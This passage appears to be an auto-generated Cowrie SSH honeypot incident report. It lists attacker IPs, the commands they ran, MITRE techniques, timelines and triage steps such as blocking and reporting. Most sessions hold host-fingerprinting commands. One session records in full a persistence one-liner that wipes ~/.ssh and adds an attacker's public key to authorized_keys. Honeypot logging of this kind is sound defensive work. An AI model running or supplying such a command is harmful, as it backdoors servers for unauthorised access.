- [ ] Block `66.154.109[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8600facc914c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:22 |
| **Last Seen** | 2026-07-01 16:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:22:27` | `cowrie.session.connect` |
| `2026-07-01 16:22:27` | `cowrie.client.version` |
| `2026-07-01 16:22:27` | `cowrie.client.kex` |
| `2026-07-01 16:22:28` | `cowrie.login.success` |
| `2026-07-01 16:22:28` | `cowrie.session.params` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.command.success` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.command.input` |
| `2026-07-01 16:22:28` | `cowrie.log.closed` |
| `2026-07-01 16:22:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aaddbfba1ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:27 |
| **Last Seen** | 2026-07-01 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:27:39` | `cowrie.session.connect` |
| `2026-07-01 16:27:39` | `cowrie.client.version` |
| `2026-07-01 16:27:40` | `cowrie.client.kex` |
| `2026-07-01 16:27:40` | `cowrie.login.success` |
| `2026-07-01 16:27:41` | `cowrie.session.params` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.command.success` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.command.input` |
| `2026-07-01 16:27:41` | `cowrie.log.closed` |
| `2026-07-01 16:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27dc49150592

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 16:28 |
| **Last Seen** | 2026-07-01 16:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:28:02` | `cowrie.session.connect` |
| `2026-07-01 16:28:02` | `cowrie.client.version` |
| `2026-07-01 16:28:02` | `cowrie.client.kex` |
| `2026-07-01 16:28:06` | `cowrie.login.success` |
| `2026-07-01 16:28:08` | `cowrie.session.params` |
| `2026-07-01 16:28:08` | `cowrie.command.input` |
| `2026-07-01 16:28:08` | `cowrie.log.closed` |
| `2026-07-01 16:28:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81380721bddb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 16:32 |
| **Last Seen** | 2026-07-01 16:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:32:09` | `cowrie.session.connect` |
| `2026-07-01 16:32:11` | `cowrie.client.version` |
| `2026-07-01 16:32:11` | `cowrie.client.kex` |
| `2026-07-01 16:32:18` | `cowrie.login.success` |
| `2026-07-01 16:32:21` | `cowrie.session.params` |
| `2026-07-01 16:32:21` | `cowrie.command.input` |
| `2026-07-01 16:32:22` | `cowrie.log.closed` |
| `2026-07-01 16:32:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5592365e2642

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:33 |
| **Last Seen** | 2026-07-01 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:33:03` | `cowrie.session.connect` |
| `2026-07-01 16:33:03` | `cowrie.client.version` |
| `2026-07-01 16:33:03` | `cowrie.client.kex` |
| `2026-07-01 16:33:04` | `cowrie.login.success` |
| `2026-07-01 16:33:05` | `cowrie.session.params` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.command.success` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.command.input` |
| `2026-07-01 16:33:05` | `cowrie.log.closed` |
| `2026-07-01 16:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51c96146382f

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 16:36 |
| **Last Seen** | 2026-07-01 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:36:35` | `cowrie.session.connect` |
| `2026-07-01 16:36:35` | `cowrie.client.version` |
| `2026-07-01 16:36:35` | `cowrie.client.kex` |
| `2026-07-01 16:36:35` | `cowrie.login.success` |
| `2026-07-01 16:36:37` | `cowrie.session.params` |
| `2026-07-01 16:36:37` | `cowrie.command.input` |
| `2026-07-01 16:36:37` | `cowrie.log.closed` |
| `2026-07-01 16:36:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0efbda1892e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:38 |
| **Last Seen** | 2026-07-01 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:38:20` | `cowrie.session.connect` |
| `2026-07-01 16:38:20` | `cowrie.client.version` |
| `2026-07-01 16:38:20` | `cowrie.client.kex` |
| `2026-07-01 16:38:21` | `cowrie.login.success` |
| `2026-07-01 16:38:21` | `cowrie.session.params` |
| `2026-07-01 16:38:21` | `cowrie.command.input` |
| `2026-07-01 16:38:21` | `cowrie.command.input` |
| `2026-07-01 16:38:21` | `cowrie.command.input` |
| `2026-07-01 16:38:21` | `cowrie.command.input` |
| `2026-07-01 16:38:21` | `cowrie.command.input` |
| `2026-07-01 16:38:21` | `cowrie.command.success` |
| `2026-07-01 16:38:21` | `cowrie.command.input` |
| `2026-07-01 16:38:21` | `cowrie.command.input` |
| `2026-07-01 16:38:22` | `cowrie.command.input` |
| `2026-07-01 16:38:22` | `cowrie.command.input` |
| `2026-07-01 16:38:22` | `cowrie.log.closed` |
| `2026-07-01 16:38:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2e08f69e0f9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 16:38 |
| **Last Seen** | 2026-07-01 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:38:55` | `cowrie.session.connect` |
| `2026-07-01 16:38:55` | `cowrie.client.version` |
| `2026-07-01 16:38:55` | `cowrie.client.kex` |
| `2026-07-01 16:38:55` | `cowrie.login.success` |
| `2026-07-01 16:38:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce398d74206

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 16:38 |
| **Last Seen** | 2026-07-01 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:38:55` | `cowrie.session.connect` |
| `2026-07-01 16:38:55` | `cowrie.client.version` |
| `2026-07-01 16:38:55` | `cowrie.client.kex` |
| `2026-07-01 16:38:55` | `cowrie.login.success` |
| `2026-07-01 16:38:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e86cab9ed2

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 16:38 |
| **Last Seen** | 2026-07-01 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:38:57` | `cowrie.session.connect` |
| `2026-07-01 16:38:57` | `cowrie.client.version` |
| `2026-07-01 16:38:57` | `cowrie.client.kex` |
| `2026-07-01 16:38:57` | `cowrie.login.success` |
| `2026-07-01 16:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d1d1b43392

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-01 16:38 |
| **Last Seen** | 2026-07-01 16:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:38:57` | `cowrie.session.connect` |
| `2026-07-01 16:38:57` | `cowrie.client.version` |
| `2026-07-01 16:38:57` | `cowrie.client.kex` |
| `2026-07-01 16:38:57` | `cowrie.login.success` |
| `2026-07-01 16:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2a540ee8a9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:43 |
| **Last Seen** | 2026-07-01 16:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:43:23` | `cowrie.session.connect` |
| `2026-07-01 16:43:23` | `cowrie.client.version` |
| `2026-07-01 16:43:23` | `cowrie.client.kex` |
| `2026-07-01 16:43:24` | `cowrie.login.success` |
| `2026-07-01 16:43:24` | `cowrie.session.params` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.command.success` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.command.input` |
| `2026-07-01 16:43:24` | `cowrie.log.closed` |
| `2026-07-01 16:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac684963165

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 16:44 |
| **Last Seen** | 2026-07-01 16:44 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:44:01` | `cowrie.session.connect` |
| `2026-07-01 16:44:03` | `cowrie.client.version` |
| `2026-07-01 16:44:03` | `cowrie.client.kex` |
| `2026-07-01 16:44:09` | `cowrie.login.success` |
| `2026-07-01 16:44:13` | `cowrie.session.params` |
| `2026-07-01 16:44:13` | `cowrie.command.input` |
| `2026-07-01 16:44:14` | `cowrie.log.closed` |
| `2026-07-01 16:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5581b8b54f13

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 16:45 |
| **Last Seen** | 2026-07-01 16:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:45:00` | `cowrie.session.connect` |
| `2026-07-01 16:45:00` | `cowrie.client.version` |
| `2026-07-01 16:45:00` | `cowrie.client.kex` |
| `2026-07-01 16:45:02` | `cowrie.login.success` |
| `2026-07-01 16:45:04` | `cowrie.session.params` |
| `2026-07-01 16:45:04` | `cowrie.command.input` |
| `2026-07-01 16:45:04` | `cowrie.log.closed` |
| `2026-07-01 16:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5cdd62fd129

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:47 |
| **Last Seen** | 2026-07-01 16:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:47:35` | `cowrie.session.connect` |
| `2026-07-01 16:47:35` | `cowrie.client.version` |
| `2026-07-01 16:47:35` | `cowrie.client.kex` |
| `2026-07-01 16:47:36` | `cowrie.login.success` |
| `2026-07-01 16:47:36` | `cowrie.session.params` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:36` | `cowrie.command.success` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:36` | `cowrie.command.input` |
| `2026-07-01 16:47:37` | `cowrie.log.closed` |
| `2026-07-01 16:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df3c05ce6793

| Field | Detail |
|---|---|
| **Source IP** | `43.163.98[.]17` |
| **First Seen** | 2026-07-01 16:48 |
| **Last Seen** | 2026-07-01 16:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:48:25` | `cowrie.session.connect` |
| `2026-07-01 16:48:25` | `cowrie.client.version` |
| `2026-07-01 16:48:25` | `cowrie.client.kex` |
| `2026-07-01 16:48:26` | `cowrie.login.success` |
| `2026-07-01 16:48:27` | `cowrie.session.params` |
| `2026-07-01 16:48:27` | `cowrie.command.input` |
| `2026-07-01 16:48:27` | `cowrie.command.failed` |
| `2026-07-01 16:48:27` | `cowrie.log.closed` |
| `2026-07-01 16:48:28` | `cowrie.session.params` |
| `2026-07-01 16:48:28` | `cowrie.command.input` |
| `2026-07-01 16:48:28` | `cowrie.session.file_download` |
| `2026-07-01 16:48:28` | `cowrie.log.closed` |
| `2026-07-01 16:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.98[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.163.98[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bcff510a8f5

| Field | Detail |
|---|---|
| **Source IP** | `43.163.98[.]17` |
| **First Seen** | 2026-07-01 16:48 |
| **Last Seen** | 2026-07-01 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:48:29` | `cowrie.session.connect` |
| `2026-07-01 16:48:29` | `cowrie.client.version` |
| `2026-07-01 16:48:29` | `cowrie.client.kex` |
| `2026-07-01 16:48:30` | `cowrie.login.success` |
| `2026-07-01 16:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.98[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.163.98[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4b790acf409

| Field | Detail |
|---|---|
| **Source IP** | `43.163.98[.]17` |
| **First Seen** | 2026-07-01 16:48 |
| **Last Seen** | 2026-07-01 16:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:48:30` | `cowrie.session.connect` |
| `2026-07-01 16:48:30` | `cowrie.client.version` |
| `2026-07-01 16:48:31` | `cowrie.client.kex` |
| `2026-07-01 16:48:31` | `cowrie.login.success` |
| `2026-07-01 16:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.98[.]17` to AbuseIPDB if not already reported
- [ ] Block `43.163.98[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-543086f12e24

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-01 16:49 |
| **Last Seen** | 2026-07-01 16:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 16:49:37` | `cowrie.session.connect` |
